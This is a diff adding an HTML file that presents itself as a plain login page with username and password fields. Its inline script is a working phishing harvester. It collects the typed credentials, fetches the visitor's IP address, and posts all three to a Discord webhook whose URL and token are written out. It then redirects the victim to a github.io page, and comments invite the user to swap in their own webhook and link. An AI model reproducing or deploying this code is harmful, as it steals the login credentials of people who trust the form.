@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="login-button">Login</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const webhookURL = 'https://discord.com/api/webhooks/1349216590364803105/rzclohWel7UMeNKFGml6hZXLUqCkXixfBqxYr0Nf5MzLlS9reeLmhJYnnh6RwOXSDb3W'; // Replace with your webhook URL.
+
+            fetch('https://api.ipify.org?format=json') // Get the user's IP
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `Username: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}`,
+                        }),
+                    }).then(() => {
+                        window.location.href = "https://sidetag1.github.io/github/"; // Replace with your desired link
+                    }).catch(error => {
+                        console.error('Error sending webhook:', error);
+                        alert('Login failed. Please try again.');
+                    });
+                })
+                .catch(error => {
+                    console.error('Error getting IP:', error);
+                    alert('Login failed. Could not retrieve IP.');
+                });
+
+        });
+    </script>
+</body>
+</html>
